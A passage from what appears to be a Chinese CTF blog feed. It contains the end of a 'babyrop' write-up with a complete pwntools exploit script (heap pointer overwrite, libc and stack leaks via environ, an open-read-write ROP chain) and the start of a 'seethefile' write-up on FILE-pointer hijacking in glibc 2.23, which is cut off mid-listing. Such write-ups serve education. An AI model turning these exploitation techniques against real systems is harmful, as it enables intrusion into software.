punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span>_create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实现任意地址读写之后，我们可以泄漏libcbase。但是由于程序设置了沙盒，我们只能通过ORW的方式来直接读出flag，那就还需要泄漏栈上的地址，然后通过ROP实现。在libc库中有一个 <code>environ</code> 字段，它负责记录指定 <code>LD_PRELOAD</code> 的语句地址，这个字段保存在栈上，如下图所示：</p><p><a href="https://imgtu.com/i/HbN1CF"><img src="https://s4.ax1x.com/2022/02/19/HbN1CF.png" alt="environ"></a></p><pre class="line-numbers language-none"><code class="language-none">pwndbg&gt; x&#x2F;3s 0x7ffe7484afd70x7ffe7484afd7: &quot;LD_PRELOAD&#x3D;.&#x2F;libc.so.6&quot;0x7ffe7484afee: &quot;.&#x2F;babyrop&quot;0x7ffe7484aff8: &quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>接下来计算一下 <code>environ</code> 字段上的地址跟ret所对应的栈上地址的偏移即可。然后就是把ROP利用链写到栈上了。</p></li><li><p><strong>EXP（自备flag）</strong></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token punctuation">,</span> terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'sp'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> binary <span class="token operator">=</span> <span class="token string">'./babyrop'</span><span class="token punctuation">,</span> arch <span class="token operator">=</span> <span class="token string">'amd64'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./babyrop'</span><span class="token punctuation">,</span> env <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'LD_PRELOAD'</span> <span class="token punctuation">:</span> <span class="token string">'./libc.so.6'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_enter</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span> ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'enter your command: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cmd<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'enter your index: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_create</span><span class="token punctuation">(</span>ind<span class="token punctuation">,</span> leng<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    _enter<span class="token punctuation">(</span><span class="token string">b'C'</span><span class="token punctuation">,</span> ind<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'How long is your safe_string: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>leng<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'enter your string: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_write</span><span class="token punctuation">(</span>ind<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>    _enter<span class="token punctuation">(</span><span class="token string">b'W'</span><span class="token punctuation">,</span> ind<span class="token punctuation">)</span>    p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'enter your string: '</span><span class="token punctuation">)</span>    p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_read</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    _enter<span class="token punctuation">(</span><span class="token string">b'R'</span><span class="token punctuation">,</span> ind<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_free</span><span class="token punctuation">(</span>ind<span class="token punctuation">)</span><span class="token punctuation">:</span>    _enter<span class="token punctuation">(</span><span class="token string">b'F'</span><span class="token punctuation">,</span> ind<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">_quit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    _enter<span class="token punctuation">(</span><span class="token string">b'E'</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>_create<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>_create<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token string">b'aaaa'</span><span class="token punctuation">)</span>_free<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>_free<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>free_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_got<span class="token punctuation">)</span>_create<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>_read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Sending 8 hex-encoded bytes\n'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span>free_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'free_addr = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>free_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libcbase <span class="token operator">=</span> free_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'free'</span><span class="token punctuation">]</span>environ_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'environ_addr = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>environ_addr<span class="token punctuation">)</span>_write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>_read<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Sending 8 hex-encoded bytes\n'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>s <span class="token operator">=</span> s<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span>s<span class="token punctuation">)</span>environ_val <span class="token operator">=</span> u64<span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'environ_val = &#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>environ_val<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>p<span class="token punctuation">)</span>ret_addr <span class="token operator">=</span> environ_val <span class="token operator">-</span> <span class="token number">0x130</span>bss_seg <span class="token operator">=</span> <span class="token number">0x404060</span>open_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'open'</span><span class="token punctuation">]</span>read_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'read'</span><span class="token punctuation">]</span>write_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'write'</span><span class="token punctuation">]</span>exit_addr <span class="token operator">=</span> libcbase <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'exit'</span><span class="token punctuation">]</span>pop_rdi_ret <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x000000000002daa2</span>pop_rsi_ret <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x0000000000037bba</span>pop_rdx_r12_ret <span class="token operator">=</span> libcbase <span class="token operator">+</span> <span class="token number">0x0000000000106751</span>fd <span class="token operator">=</span> <span class="token number">3</span>orw_payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_seg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>open_addr<span class="token punctuation">)</span> <span class="token operator">+</span>\            p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fd<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_seg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>read_addr<span class="token punctuation">)</span> <span class="token operator">+</span>\            p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rsi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_seg<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdx_r12_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>write_addr<span class="token punctuation">)</span> <span class="token operator">+</span>\            p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>exit_addr<span class="token punctuation">)</span>flag_str <span class="token operator">=</span> <span class="token string">b'flag\x00'</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag_str<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>bss_seg<span class="token punctuation">)</span>_write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>_write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> flag_str<span class="token punctuation">)</span>payload <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>orw_payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span>_write<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>_write<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> orw_payload<span class="token punctuation">)</span>_quit<span class="token punctuation">(</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2></li></ol>   <pre class="line-numbers language-none"><code class="language-none">链接：https:&#x2F;&#x2F;pan.baidu.com&#x2F;s&#x2F;1AtGRcu0SLHVk12e4e-9wJg 提取码：9if2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>seethefile</title>
      <link href="/2022/02/03/seethefile/"/>
      <url>/2022/02/03/seethefile/</url>
      
        <content type="html"><![CDATA[<h1 id="seethefile"><a href="#seethefile" class="headerlink" title="seethefile"></a>seethefile</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><pre class="line-numbers language-none"><code class="language-none">Glibc:    2.23Arch:     i386-32-littleRELRO:    Partial RELROStack:    No canary foundNX:       NX enabledPIE:      No PIE (0x8048000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p>全局变量 <code>name</code> 后面紧跟着的就是 <code>fp</code>：</p><pre class="line-numbers language-none"><code class="language-none">.bss:0804B260 name            db 20h dup(?)           ; DATA XREF: main+9F↑o.bss:0804B260                                         ; main+B4↑o.bss:0804B280                 public fp.bss:0804B280 ; FILE *fp.bss:0804B280 fp              dd ?                    ; DATA XREF: openfile+6↑r.bss:0804B280                                         ; openfile+AD↑w ....bss:0804B280 _bss            ends.bss:0804B280<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在执行选项五 <code>exit</code>的时候，会输入 <code>name</code>，此时可以篡改 <code>fp</code>指针：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">case</span> <span class="token number">5</span><span class="token operator">:</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Leave your name :"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Thank you %s ,see you next time\n"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> fp <span class="token punctuation">)</span>    <span class="token function">fclose</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>泄露 <code>libc</code>基地址可以通过查看 <code>/proc/self/maps</code> 文件。本题中，由于选项二 <code>readfile</code>在将文件内容读取到 <code>magicbuf</code>的时候长度限制为 <code>0x18Fu</code>，我们只能看到下面这部分：</p><pre class="line-numbers language-none"><code class="language-none">&#39;08048000-0804a000 r-xp 00000000 08:00 249799                             &#x2F;home&#x2F;seethefile&#x2F;seethefile\n&#39;&#39;0804a000-0804b000 r--p 00001000 08:00 249799                             &#x2F;home&#x2F;seethefile&#x2F;seethefile\n&#39;&#39;0804b000-0804c000 rw-p 00002000 08:00 249799                             &#x2F;home&#x2F;seethefile&#x2F;seethefile\n&#39;&#39;09b8b000-09bad000 rw-p 00000000 00:00 0                                  [heap]\n&#39;&#39;f7565000-f756600&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>本地测试一下可以发现：基本上 <code>[heap]</code>段后面第二个就是 <code>libc</code>了，所以在上面这个远程尝试中， <code>0xf7566000</code>应该就是 <code>libcbase</code>。</p><pre class="line-numbers language-none"><code class="language-none">$ cat &#x2F;proc&#x2F;self&#x2F;maps00400000-0040c000 r-xp 00000000 08:01 3407896                            &#x2F;bin&#x2F;cat0060b000-0060c000 r--p 0000b000 08:01 3407896                            &#x2F;bin&#x2F;cat0060c000-0060d000 rw-p 0000c000 08:01 3407896                            &#x2F;bin&#x2F;cat008ae000-008cf000 rw-p 00000000 00:00 0                                  [heap]7fdc4c1a5000-7fdc4cb64000 r--p 00000000 08:01 1974054                    &#x2F;usr&#x2F;lib&#x2F;locale&#x2F;locale-archive7fdc4cb64000-7fdc4cd24000 r-xp 00000000 08:01 2626483                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so7fdc4cd24000-7fdc4cf24000 ---p 001c0000 08:01 2626483                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so7fdc4cf24000-7fdc4cf28000 r--p 001c0000 08:01 2626483                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so7fdc4cf28000-7fdc4cf2a000 rw-p 001c4000 08:01 2626483                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc-2.23.so7fdc4cf2a000-7fdc4cf2e000 rw-p 00000000 00:00 0 7fdc4cf2e000-7fdc4cf54000 r-xp 00000000 08:01 2626455                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so7fdc4d116000-7fdc4d13b000 rw-p 00000000 00:00 0 7fdc4d153000-7fdc4d154000 r--p 00025000 08:01 2626455                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so7fdc4d154000-7fdc4d155000 rw-p 00026000 08:01 2626455                    &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;ld-2.23.so7fdc4d155000-7fdc4d156000 rw-p 00000000 00:00 0 7fffbd3cd000-7fffbd3ee000 rw-p 00000000 00:00 0                          [stack]7fffbd3ef000-7fffbd3f2000 r--p 00000000 00:00 0                          [vvar]7fffbd3f2000-7fffbd3f4000 r-xp 00000000 00:00 0                          [vdso]ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>在 glibc2.23 中，<code>fp = fopen(&quot;[filename]&quot;)</code>中的 <code>fp</code>指向的是一个 <code>_IO_FILE_plus</code>结构体。以本题为例，<code>open</code>之后下断点查看 <code>fp</code>：</p><pre class="line-numbers language-none"><code class="language-none">gdb-peda$ x&#x2F;5wx 0x0804B280 0x804b280 &lt;fp&gt;:0x0804c4100x000000000x000000000x000000000x804b290:0x00000000gdb-peda$ x&#x2F;40wx 0x0804c4100x804c410:0xfbad24880x000000000x000000000x000000000x804c420:0x000000000x000000000x000000000x000000000x804c430:0x000000000x000000000x000000000x000000000x804c440:0x000000000xf7fb7cc00x000000030x000000000x804c450:0x000000000x000000000x0804c4a80xffffffff0x804c460:0xffffffff0x000000000x0804c4b40x000000000x804c470:0x000000000x000000000x000000000x000000000x804c480:0x000000000x000000000x000000000x000000000x804c490:0x000000000x000000000x000000000x000000000x804c4a0:0x000000000xf7fb6ac00x000000000x00000000gdb-peda$ p *_IO_list_all$1 &#x3D; &#123;  file &#x3D; &#123;    _flags &#x3D; 0xfbad2488,     _IO_read_ptr &#x3D; 0x0,     _IO_read_end &#x3D; 0x0,     _IO_read_base &#x3D; 0x0,     _IO_write_base &#x3D; 0x0,     _IO_write_ptr &#x3D; 0x0,     _IO_write_end &#x3D; 0x0,     _IO_buf_base &#x3D; 0x0,     _IO_buf_end &#x3D; 0x0,     _IO_save_base &#x3D; 0x0,     _IO_backup_base &#x3D; 0x0,     _IO_save_end &#x3D; 0x0,     _markers &#x3D; 0x0,     _chain &#x3D; 0xf7fb7cc0 &lt;_IO_2_1_stderr_&gt;,     _fileno &#x3D; 0x3,     _flags2 &#x3D; 0x0,     _old_offset &#x3D; 0x0,     _cur_column &#x3D; 0x0,     _vtable_offset &#x3D; 0x0,     _shortbuf &#x3D; &quot;&quot;,     _lock &#x3D; 0x804c4a8,     _offset &#x3D; 0xffffffffffffffff,     _codecvt &#x3D; 0x0,     _wide_data &#x3D; 0x804c4b4,     _freeres_list &#x3D; 0x0,     _freeres_buf &#x3D; 0x0,     __pad5 &#x3D; 0x0,     _mode &#x3D; 0x0,     _unused2 &#x3D; &#39;\000&#39; &lt;repeats 39 times&gt;  &#125;,   vtable &#x3D; 0xf7fb6ac0 &lt;_IO_file_jumps&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>对比一下就可以发现：<code>fp</code>指向的就是 <code>_IO_list_all</code>结构体，其中 <code>file</code>占用 <code>0x94</code>字节，后面紧跟着 <code>vtable</code>字段：</p><pre class="line-numbers language-none"><code class="language-none">gdb-peda$ x&#x2F;28wx 0xf7fb6ac00xf7fb6ac0 &lt;_IO_file_jumps&gt;:0x000000000x000000000xf7e6d9900xf7e6e3b00xf7fb6ad0 &lt;_IO_file_jumps+16&gt;:0xf7e6e1500xf7e6f2300xf7e700c00xf7e6d6000xf7fb6ae0 &lt;_IO_file_jumps+32&gt;:0xf7e6d2100xf7e6c4b00xf7e6f4d00xf7e6c2f00xf7fb6af0 &lt;_IO_file_jumps+48&gt;:0xf7e6c1e00xf7e618d00xf7e6d5b00xf7e6d0600xf7fb6b00 &lt;_IO_file_jumps+64&gt;:0xf7e6cda00xf7e6c2c00xf7e6d0400xf7e702500xf7fb6b10 &lt;_IO_file_jumps+80&gt;:0xf7e702600x000000000x000000000x000000000xf7fb6b20 &lt;_IO_str_jumps&gt;:0x000000000x000000000xf7e707600xf7e703f0gdb-peda$ print _IO_file_jumps$2 &#x3D; &#123;  __dummy &#x3D; 0x0,   __dummy2 &#x3D; 0x0,   __finish &#x3D; 0xf7e6d990 &lt;_IO_new_file_finish&gt;,   __overflow &#x3D; 0xf7e6e3b0 &lt;_IO_new_file_overflow&gt;,   __underflow &#x3D; 0xf7e6e150 &lt;_IO_new_file_underflow&gt;,   __uflow &#x3D; 0xf7e6f230 &lt;__GI__IO_default_uflow&gt;,   __pbackfail &#x3D; 0xf7e700c0 &lt;__GI__IO_default_pbackfail&gt;,   __xsputn &#x3D; 0xf7e6d600 &lt;_IO_new_file_xsputn&gt;,   __xsgetn &#x3D; 0xf7e6d210 &lt;__GI__IO_file_xsgetn&gt;,   __seekoff &#x3D; 0xf7e6c4b0 &lt;_IO_new_file_seekoff&gt;,   __seekpos &#x3D; 0xf7e6f4d0 &lt;_IO_default_seekpos&gt;,   __setbuf &#x3D; 0xf7e6c2f0 &lt;_IO_new_file_setbuf&gt;,   __sync &#x3D; 0xf7e6c1e0 &lt;_IO_new_file_sync&gt;,   __doallocate &#x3D; 0xf7e618d0 &lt;__GI__IO_file_doallocate&gt;,   __read &#x3D; 0xf7e6d5b0 &lt;__GI__IO_file_read&gt;,   __write &#x3D; 0xf7e6d060 &lt;_IO_new_file_write&gt;,   __seek &#x3D; 0xf7e6cda0 &lt;__GI__IO_file_seek&gt;,   __close &#x3D; 0xf7e6c2c0 &lt;__GI__IO_file_close&gt;,   __stat &#x3D; 0xf7e6d040 &lt;__GI__IO_file_stat&gt;,   __showmanyc &#x3D; 0xf7e70250 &lt;_IO_default_showmanyc&gt;,   __imbue &#x3D; 0xf7e70260 &lt;_IO_default_imbue&gt;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这部分的glibc源码如下：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">_IO_jump_t</span><span class="token punctuation">&#123;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>size_t<span class="token punctuation">,</span> __dummy2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_finish_t<span class="token punctuation">,</span> __finish<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_overflow_t<span class="token punctuation">,</span> __overflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __underflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token punctuation">(</span>_IO_underflow_t<span class="token punctuation">,</span> __uflow<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">JUMP_FIELD</span><span class="token 